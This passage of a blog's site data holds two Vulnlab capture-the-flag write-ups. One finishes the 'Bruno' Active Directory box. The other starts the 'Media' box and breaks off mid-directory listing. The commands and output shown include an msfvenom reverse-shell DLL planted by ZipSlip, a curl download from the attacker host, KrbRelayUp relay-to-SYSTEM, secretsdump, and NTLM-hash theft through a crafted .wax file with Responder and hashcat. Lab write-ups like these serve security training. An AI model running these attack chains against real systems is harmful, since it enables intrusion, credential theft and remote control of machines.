10.10.126.214 --zip</span><br></pre></td></tr></table></figure>\n\n<p>You should then be able to import the compressed domain object archive into Bloodhound to view all the domain objects within LDAP.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/e.png\"></p>\n<p>It does not seem as though our user has any obscenely prevalent privileges, so we’ll have to look elsewhere.</p>\n<p>Let’s have a look at SMB given that we have credentials to a legitimate user now.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.126.214 -U &#x27;svc_scan&#x27;</span><br><span class=\"line\">Password for [WORKGROUP\\svc_scan]:</span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">CertEnroll      Disk      Active Directory Certificate Services share</span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">NETLOGON        Disk      Logon server share</span><br><span class=\"line\">queue           Disk</span><br><span class=\"line\">SYSVOL          Disk      Logon server share</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice that we now have access to a decent amount of SMB shares, though there is an interesting one that we can see currently. There seems to be a share called <code>queue</code>, which if you’ll remember, is similar to the name of a directory that we found in FTP.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.126.214\\\\queue -U &#x27;svc_scan&#x27;</span><br><span class=\"line\">Password for [WORKGROUP\\svc_scan]:</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Wed Jun 29 12:33:48 2022</span><br><span class=\"line\">  ..                                  D        0  Wed Jun 29 09:41:03 2022</span><br><span class=\"line\"></span><br><span class=\"line\">7863807 blocks of size 4096. 3739137 blocks available</span><br><span class=\"line\">smb: \\&gt; put test.txt</span><br><span class=\"line\">putting file test.txt as \\test.txt (0.0 kb/s) (average 0.0 kb/s)</span><br><span class=\"line\">smb: \\&gt;</span><br></pre></td></tr></table></figure>\n\n<p>If you’ll also notice, we have write access onto this share as well.</p>\n<p>There aren’t many other leads - given that we do not have access to any other users at the moment or access to any other services that would be of use to us. The other SMB directories don’t seem to hold anything either, as I made sure to enumerate other parts of the machine to make sure I didn’t miss anything.</p>\n<h1 id=\"Reverse-Engineering-SampleScanner\"><a href=\"#Reverse-Engineering-SampleScanner\" class=\"headerlink\" title=\"Reverse Engineering SampleScanner\"></a>Reverse Engineering SampleScanner</h1><p>At this point, I decided to take a look back at the SampleScanner application to see if we could perform any DLL Hijacking. This is mainly just due to the notion of a DLL and the fact that this application seems to be a custom executable as I could not find source code for it anywhere.</p>\n<p>Let’s first start by opening ProcMon via the <a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite\">SysInternalsSuite</a>. Navigate to <code>Filter &gt; Filter</code> (or just Ctrl+L), and use the configuration as seen below.</p>\n<ul>\n<li>Process Name - begins with - SampleScanner -&gt; then Include</li>\n<li>Path - ends with - .dll -&gt; then Include</li>\n<li>Result - begins with - NAME -&gt; then Include</li>\n</ul>\n<p><img src=\"/images/vulnlab/bruno-vl/f.png\"></p>\n<p>We’ll then apply the filters and ProcMon will start listening to events that fall under our filter settings. Run the binary and you should see some events populate.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/g.png\"></p>\n<p>You’ll get a lot of results, so I’ve highlighted two important entries that get logged into ProcMon. The two highlights I have are DLLs that are not found within the current directory. The key note here is that they are DLLs that are within the <strong>current directory</strong>, meaning it will be using the same directory that the <code>SampleScanner</code> application is within.</p>\n<p>This means we can plant a malicious DLL into the same directory as application and it should execute it, giving us a reverse shell.  But that being said, how can we do so and how do we know what the application is actually doing?</p>\n<p>Before that, I want to note that the executable spits out an error if you run it properly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS Microsoft.PowerShell.Core\\FileSystem::\\\\wsl.localhost\\kali-linux\\home\\daz\\tech\\bruno\\scanner\\SampleScanner&gt; .\\SampleScanner.exe</span><br><span class=\"line\">Unhandled exception. System.IO.DirectoryNotFoundException: Could not find a part of the path &#x27;C:\\samples\\queue&#x27;.</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerator`1.CreateDirectoryHandle(String path, Boolean ignoreNotFound)</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerator`1.Init()</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerator`1..ctor(String directory, Boolean isNormalized, EnumerationOptions options)</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerable`1..ctor(String directory, FindTransform transform, EnumerationOptions options, Boolean isNormalized)</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerableFactory.UserFiles(String directory, String expression, EnumerationOptions options)</span><br><span class=\"line\">   at System.IO.Directory.InternalEnumeratePaths(String path, String searchPattern, SearchTarget searchTarget, EnumerationOptions options)</span><br><span class=\"line\">   at SampleScanner.Program.Main(String[] args)</span><br></pre></td></tr></table></figure>\n\n<p>The key thing to look at here is that it seems that a static file path is being searched, the <code>C:\\samples\\queue</code> directory. This is interesting because we have write access to this folder via SMB as <code>svc_scan</code>.</p>\n<p>To start with reversing the binary itself, we can first examine the <code>SampleScanner.dll</code> to see specifically what the executable is doing as this DLL is more than likely associated with the main functionality of the application. We can do so with <a href=\"https://github.com/icsharpcode/ILSpy\">ILSpy</a>, a reverse engineering decompiler used for examining application source code. We’ll import the <code>SampleScanner.dll</code> into ILSpy.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/h.png\"></p>\n<p>We’re mainly concerned with the Main function inside of the original <code>SampleScanner</code> library that is decompiled. </p>\n<p>In the screenshot above, you’ll notice that there are various hints about a “ZipArchive” entry as a class within the main source code. Let’s take a look farther into these classes to see if there’s anything we can find.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/i.png\"></p>\n<p>Looking into those classes, it looks like the zip archive is opening the archive itself with <code>GetEntry</code> and <code>get_ArchiveReader</code>. These contents are then scanned by the application itself to simulate a malware scan.</p>\n<p>So from reverse engineering the binary we discovered three things:</p>\n<ul>\n<li>A DLL using the relative path of the binary is not being loaded</li>\n<li>The application itself is attempting to open any archives within a specified directory.</li>\n<li>The specified directory itself, <code>C:\\samples\\queue</code>, is a directory that we have write access onto.</li>\n</ul>\n<p>After doing some research into what we have in front of us, I came across an interesting exploit that seems to fit our situation - the ZipSlip.</p>\n<h1 id=\"DLL-Hijacking-via-ZipSlip\"><a href=\"#DLL-Hijacking-via-ZipSlip\" class=\"headerlink\" title=\"DLL Hijacking via ZipSlip\"></a>DLL Hijacking via ZipSlip</h1><p><a href=\"https://security.snyk.io/research/zip-slip-vulnerability\">ZipSlip</a> is essentially a vulnerability that allows us to perform file creation via path traversal in a zip archive. If a zip archive is opened automatically by a program, we can create a compressed archive with a file that has path traversal characters in its name, such as <code>../revshell.exe</code>. This will place our executable in the parent folder of where it was opened.</p>\n<p>In our case, we want to place a malicious executable in <code>../app/(malicious_file_here)</code>. This should be within the same path as the binary, which is where the application is trying to load DLLs from.</p>\n<p>Since we know the names of the DLL that are not found within the application’s direct path, we can use those as the names for our malicious DLLs. We can craft a malicious DLL using <code>msfvenom</code>, as seen below and then convert it to a zip archive. You can use either <code>hostfxr.dll</code> or <code>Microsoft.DiaSymReader.Native.amd64.dll</code>, as either will work for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=10.8.0.173 LPORT=9001 &gt; hostfxr.dll            </span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of dll file: 9216 bytes</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ zip host.zip hostfxr.dll</span><br><span class=\"line\">  adding: hostfxr.dll (deflated 80%)</span><br></pre></td></tr></table></figure>\n\n<p>We can then use an archive manager such as 7-Zip File Manager (in my case I transferred the DLL to my Windows host) to view the archive and edit the name accordingly.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/j.png\"></p>\n<p>As seen above, you can implement directory traversal characters in 7-Zip without any issues. This will create two mock directories within the archive, which will be the traversal method when we transfer it to the target machine.</p>\n<p>Now that we have the respective archive set up, let’s start up our listener and transfer the archive to the <code>queue</code> share. (Note that I changed the name of the archive to <code>host_sample.zip</code>)</p>\n<p><img src=\"/images/vulnlab/bruno-vl/k.png\"></p>\n<p>After some time as you’ll see, the ZipSlip exploit worked properly and the DLL was moved to the <code>app</code> directory. After about a minute or so, you’ll see that our reverse shell called back and we now should have a session as <code>svc_scan</code>.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/l.png\"></p>\n<h1 id=\"Internal-Enumeration\"><a href=\"#Internal-Enumeration\" class=\"headerlink\" title=\"Internal Enumeration\"></a>Internal Enumeration</h1><p>Now that we have a session on the remote host, we’ll do a bit of enumeration on the domain computer to see if there are any ways to escalate our privileges.</p>\n<p>The root <code>C:\\</code> drive contains the first user flag as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----         8/19/2021   6:24 AM                EFI</span><br><span class=\"line\">d-----         6/29/2022   2:43 PM                inetpub</span><br><span class=\"line\">d-----          5/8/2021   8:20 AM                PerfLogs</span><br><span class=\"line\">d-r---         6/29/2022   4:15 PM                Program Files</span><br><span class=\"line\">d-----         6/29/2022   1:28 PM                Program Files (x86)</span><br><span class=\"line\">d-----         6/29/2022   1:41 PM                samples</span><br><span class=\"line\">d-r---         6/29/2022   4:09 PM                Users</span><br><span class=\"line\">d-----         6/29/2022   1:32 PM                Windows</span><br><span class=\"line\">-a----         6/29/2022   3:00 PM             37 user.txt</span><br></pre></td></tr></table></figure>\n\n<p>There does seem to be an <code>inetpub</code> directory which contains the default IIS website that we saw previously, however we do not have write access to this part of the system meaning we won’t be able to exploit it.</p>\n<p>Furthermore, there does not seem to be any outstanding program applications on the internal machine that we can exploit, nor any services that are running on an internal port.</p>\n<p>At this point, I decided to see if an internal machine scraper such as <a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS\">WinPEAS</a>. This should tell us if there are any hidden vulnerabilities that we wouldn’t be able to see from an initial glance. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; curl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe</span><br><span class=\"line\">curl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe</span><br><span class=\"line\">PS C:\\temp&gt; .\\winPEASany_ofs.exe</span><br><span class=\"line\">......</span><br><span class=\"line\">Checking KrbRelayUp</span><br><span class=\"line\">  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup</span><br><span class=\"line\">  The system is inside a domain (BRUNO) so it could be vulnerable.</span><br><span class=\"line\">  You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges</span><br></pre></td></tr></table></figure>\n\n<p>As you’ll notice, this should spider the entire filesystem and report any vulnerabilities back to us. The above vulnerability is reported often when I run WinPEAS, however there was something interesting that I found that may we may be able to exploit.</p>\n<h1 id=\"Privilege-Escalation-via-KrbRelayUp-CLSIDs\"><a href=\"#Privilege-Escalation-via-KrbRelayUp-CLSIDs\" class=\"headerlink\" title=\"Privilege Escalation via KrbRelayUp&#x2F;CLSIDs\"></a>Privilege Escalation via KrbRelayUp&#x2F;CLSIDs</h1><p>One thing you’ll notice is that our user currently has a MAQ of 10. A MAQ, or MachineAccountQuota, essentially allows the domain object to create domain computer objects and use them within the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nxc ldap 10.10.73.8 -u &#x27;svc_scan&#x27; -p &#x27;[...snip...]&#x27; -M maq</span><br><span class=\"line\">SMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   </span><br><span class=\"line\">LDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\\svc_scan:[...snip...]</span><br><span class=\"line\">MAQ         10.10.73.8      389    BRUNODC          [*] Getting the MachineAccountQuota</span><br><span class=\"line\">MAQ         10.10.73.8      389    BRUNODC          MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>\n\n<p>Furthermore, the LDAP does not have signing enabled. This cements the fact that a Kerberos relay attack is possible through KrbRelayUp.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nxc ldap 10.10.73.8 -u &#x27;svc_scan&#x27; -p &#x27;[...snip...]&#x27; -M ldap-checker</span><br><span class=\"line\">SMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   </span><br><span class=\"line\">LDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\\svc_scan:[...snip...]</span><br><span class=\"line\">LDAP-CHE... 10.10.73.8      389    BRUNODC          LDAP Signing NOT Enforced!</span><br><span class=\"line\">LDAP-CHE... 10.10.73.8      389    BRUNODC          LDAPS Channel Binding is set to &quot;NEVER&quot;</span><br></pre></td></tr></table></figure>\n\n<p>A Kerberos relay attack is essentially an authentication attack much like NTLM relay that allows us to relay a domain objects Kerberos authentication to another service. This essentially allows us to relay an ASREQ to any SPN that we need to authenticate to. Where LDAP signing essentially plays a picture into this is that it will encrypt all traffic over LDAP, meaning we won’t be able to properly sniff the traffic for authentication tokens as a MITM. If you want to delve into more information about Kerberos Relaying and how it works, <a href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\">this</a> was the blog post I used mainly as research into the topic.</p>\n<p>In our case, we should be able to create a fake domain computer object and coerce an authentication attempt using RBCD. The only issue is, how do we do coerce authentication if we’re using Kerberos authentication? This is where the idea of abusing <a href=\"https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D.\">CLSIDs</a> comes into play, as CLSIDs are essentially identifiers for application components in Windows. These are predefined by the Windows operating system, meaning we can use a curated list <a href=\"https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt\">here</a> or <a href=\"https://vulndev.io/cheats-windows/\">here</a>. We’re specifically looking for one that works with Windows Server 2019&#x2F;2022, as that is the current operating system that we’re on.</p>\n<p>In particular, the CLSID I picked was <code>d99e6e73-fc88-11d0-b498-00a0c90312f3</code>. We’ll need to compile <a href=\"https://github.com/Dec0ne/KrbRelayUp.git\">KrbRelayUp</a> in order to exploit this on the target machine. Luckily enough, Defender is not enabled on this box so we shouldn’t have to bypass AV for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; &quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">&quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>\n\n<p>So once we have the <code>KrbRelayUp</code> binary compiled, we’ll execute it on the target machine using the CLSID that we have selected.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3</span><br><span class=\"line\">.\\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3</span><br><span class=\"line\">KrbRelayUp - Relaying you to SYSTEM</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[+] Rewriting function table</span><br><span class=\"line\">[+] Rewriting PEB</span><br><span class=\"line\">[+] Init COM server</span><br><span class=\"line\">[+] Computer account &quot;daz$&quot; added with password &quot;Password123@&quot;</span><br><span class=\"line\">[+] Looking for available ports..</span><br><span class=\"line\">[+] Port 2869 available</span><br><span class=\"line\">[+] Register COM server</span><br><span class=\"line\">[+] Forcing SYSTEM authentication</span><br><span class=\"line\">[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...</span><br><span class=\"line\">[+] LDAP session established</span><br><span class=\"line\">[+] RBCD rights added successfully</span><br><span class=\"line\">[+] Run the spawn method for SYSTEM shell:</span><br><span class=\"line\">./KrbRelayUp.exe spawn -m rbcd -d bruno.vl -dc brunodc.bruno.vl -cn daz$ -cp Password123@</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then execute the command provided so that a TGT request can be sent to the KDC. This allows us to use <code>getST</code> after this command to retrieve a TGS on behalf of the Administrator account to CIFS using our fake machine account.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-getST -spn cifs/brunodc.bruno.vl -impersonate Administrator -dc-ip 10.10.116.111 bruno.vl/&#x27;daz$&#x27;:&#x27;Password123@&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then dump the secrets of the machine using <code>secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-secretsdump -k brunodc.bruno.vl                                                                       </span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Service RemoteRegistry is in stopped state</span><br><span class=\"line\">[*] Starting service RemoteRegistry</span><br><span class=\"line\">[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d</span><br><span class=\"line\">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class=\"line\">......</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:13735[...snip...]bfd4:::</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Administrator’s NT hash, we can use that to login to WinRM.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/m.png\"></p>\n<p>Now that we are currently the Administrator, we can read the root flag within the Administrator’s Desktop directory. That means we have successfully rooted this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was very difficult, and it gave me some new insight on doing more RBCD exploitation. DLL Hijacking and reverse engineering are both topics that this machine covered well, and I have no complaints. Big thanks to xct for this machine.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite\">https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a><br><a href=\"https://github.com/icsharpcode/ILSpy\">https://github.com/icsharpcode/ILSpy</a><br><a href=\"https://security.snyk.io/research/zip-slip-vulnerability\">https://security.snyk.io/research/zip-slip-vulnerability</a><br><a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS\">https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS</a><br><a href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a><br><a href=\"https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D\">https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D</a>.<br><a href=\"https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt\">https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt</a><br><a href=\"https://vulndev.io/cheats-windows/\">https://vulndev.io/cheats-windows/</a><br><a href=\"https://github.com/Dec0ne/KrbRelayUp\">https://github.com/Dec0ne/KrbRelayUp</a></p>\n"},{"title":"Media - Vulnlab","date":"2024-08-08T13:42:08.000Z","keywords":"Vulnlab, Medium, Windows","description":"Sendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I'll go over two methods that I was able to perform for both foothold and privilege escalation. I'm guessing that we'll see many similar tactics to the AD boxes that I've completed before.","cover":"/images/vulnlab/media-vl/media_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nMedia is one of the last Medium machines that I'll cover as a part of the medium machines chains. I still have to do the Linux machines along with Unintended (the only Linux-specific chain) but we'll get to those later. This machine covers NTLM theft along with exploiting symlinks and restoring an IIS accounts vulnerable privileges.\n\n# Enumeration\n\nTo start, let's do our usual NMAP scan.\n\n```\n└─$ sudo nmap 10.10.115.42\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 21:54 EDT\nNmap scan report for 10.10.115.42\nHost is up (0.11s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 19.21 seconds\n```\n\nIt seems that there's a webserver along with remote interface protocols being SSH and RDP. I doubt that we'll have immediate access to these, so our entry point is probably going to be the webserver itself.\n\n![](/images/vulnlab/media-vl/b.png)\n\nThe web application seems to be called \"Promotion Studio\", or at least that could be the CMS being used on the backend. Wappalyzer did give us a bit of info on this website - specifically that it is an Apache webserver running PHP. Aside from that though, we don't have much.\n\nScrolling down however, we do have a noticeable result that may be of use to us.\n\n![](/images/vulnlab/media-vl/c.png)\n\n# NTLM Theft via Windows Media Player\n\nThere looks to be an upload functionality for the hiring team accepting applicants. The process is a bit different than sending a regular document, as it seems that the upload functionality itself is only accepting files that are compatible with Windows Media Player.\n\nDoing some research into the specific file format, it looks like the file extension that we're looking for are either `.asf`, `.wma`, `.wax`, and a few others.\n\n![](/images/vulnlab/media-vl/d.png)\n\nThe interesting part here is that `.wax` is a valid file extension for Windows Media Player, which is also a file extension that is exploitable by NTLM Theft. \n\nTo those who don't know, there are a large variety of files within Windows that are vulnerable to NTLM theft. This specific attack allows us to create a malicious file that will seem like a regular file, however it will instead perform a request to an endpoint that we control.\n\nIn Windows whenever an attempt is made to a URI endpoint, the NetNTLM hash of the client account (the user making the request to the endpoint) is exchanged with the server that is hosting the endpoint. NTLM Theft allows us to poison the request that is made, and extract the NetNTLM hash of the user. This hash is effectively encrypted with the user's plaintext password, giving us the opportunity to crack it.\n\nIn our case, we can create a `.wax` Windows Media Player file and have it point to our attacker machine. If the `.wax` file is executed by a user on the backend of the machine, it poison the request and direct it to our MITM server that we stand up.\n\nTo start, we'll boot up Responder in a separate terminal tab.\n\n```\n└─$ sudo responder -I tun0\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.4.0\n......\n[+] Listening for events...\n```\n\nNext, we'll generate a few files using Greenwolf's NTLM theft file generation [here](https://github.com/Greenwolf/ntlm_theft). There is an abundance of different file formats you can use, however we'll be using the `.wax` file type in our case.\n\n```\n└─$ python3 ntlm_theft.py -g wax -s 10.8.0.173 -f daz\nCreated: daz/daz.wax (OPEN)\nGeneration Complete.\n\n└─$ ls -la daz       \ntotal 12\ndrwxrwxr-x 2 daz daz 4096 Aug  7 22:10 .\ndrwxrwxr-x 7 daz daz 4096 Aug  7 22:10 ..\n-rw-rw-r-- 1 daz daz   54 Aug  7 22:10 daz.wax\n```\n\nAll that's left now is to transfer this file via the file upload functionality and wait for any NTLM hash exchanges that are captured in Responder.\n\nAfter about a minute or two of waiting, you should see a successfully captured hash appear.\n\n```\n[+] Listening for events...                                                                                                   \n\n[SMB] NTLMv2-SSP Client   : 10.10.115.42\n[SMB] NTLMv2-SSP Username : MEDIA\\enox\n[SMB] NTLMv2-SSP Hash     : enox::MEDIA:6698cf0238d6cc81:A7112EF24883911141FD714144D4B6FB:010100000000000000F00E5716E9DA014E8B[...snip...]0000000000                                          \n[*] Skipping previously captured hash for MEDIA\\enox\n[*] Skipping previously captured hash for MEDIA\\enox\n```\n\nWe'll crack this using hashcat along with its hash-identifier, which is 5600 for NetNTLM-v2 hashes.\n\n```\n└─$ hashcat -a 0 -m 5600 enox_hash.txt /usr/share/wordlists/rockyou.txt \nhashcat (v6.2.6) starting\n......\n310030002e0038002e0030002e003100370033000000000000000000:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\n```\n\nAs you can see, we were successfully able to crack the hash for the `enox` user and can now use it to enumerate the target machine.\n\nGiven that we now have credentials and there isn't any form of LDAP or Kerberos on this machine, let's just test a simple authentication attempt through SSH.\n\n```\n└─$ ssh enox@10.10.115.42\nenox@10.10.115.42's password:\nMicrosoft Windows [Version 10.0.20348.1970]\n(c) Microsoft Corporation. All rights reserved.\n\nenox@MEDIA C:\\Users\\enox>\n```\n\nThe first user flag is within the `enox` user's Desktop directory in their home folder.\n\n# Host Reconnaissance\n\nNow that we have shell access as a user on the machine, let's look around a bit. As I said before, there isn't any form of LDAP or Kerberos on this machine, so our privilege escalation should rely and be exploiting completely through the shell that we currently have access to.\n\n```\nPS C:\\> ls\n\nDirectory: C:\\\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          5/8/2021   1:20 AM                PerfLogs\nd-r---        10/10/2023   6:32 AM                Program Files\nd-----          5/8/2021   2:40 AM                Program Files (x86)\nd-r---         10/2/2023  10:26 AM                Users\nd-----        10/10/2023   6:41 AM                Windows\nd-----         10/2/2023  11:03 AM                xampp\n```\n\nThe `C:\\` drive does not seem to have anything obscenely useful in our case, as the `xampp` server is the webserver that we previously exploited.\n\nThe first thing that jumped out to me (since we don't seem to have any exploitable privileges) is the `xampp` webserver directory itself. Generally, files within a `xampp` webserver are hosted within `C:\\xampp\\htdocs`.\n\n```\nPS C:\\xampp\\htdocs> echo 'test' > test.txt\nout-file : Access to the path 'C:\\xampp\\htdocs\\test.txt' is denied.\nAt line:1 char:1\n+ echo 'test' > test.txt\n+ ~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException\n    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand\n```\n\nHowever as you'll notice, it does not seem as though we have write access to this directory. At this point there wouldn't be any form\n\nSomething that also stood out to me after a bit of filesystem enumeration was how the `.wax` files were processed on the backend. In regular cases, this would generally be a user or a group of people from the team. There is however, a script to automate this in `C:\\Users\\enox\\Documents`.\n\n```\nPS C:\\Users\\enox\\Documents> cat review.ps1\n......\n$todofile=\"C:\\\\Windows\\\\Tasks\\\\Uploads\\\\todo.txt\"\n$mediaPlayerPath = \"C:\\Program Files (x86)\\Windows Media Player\\wmplayer.exe\"\n\n\nwhile($True){\n\n    if ((Get-Content -Path $todofile) -eq $null) {\n        Write-Host \"Todo is empty.\"\n        Sleep 60 # Sleep for 60 seconds before rechecking\n    }\n```\n\nThe interesting part is the `todofile` that is being commit to a variable name. Browsing to this file in `C:\\Windows\\Tasks\\Uploads` looks to have nothing in it, so we can assume that this text file is only populated when the review script is being ran.\n\nHowever in this directory, you'll notice that there are a few directories alongside the text file. These directories may differ from you, as they seem to be relative to the uploaded file itself.\n\n```\nPS C:\\Windows\\Tasks\\uploads> ls\n\nDirectory: C:\\Windows\\Tasks\\uploads\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----                                                \nd-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4\nd-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd\n-a----          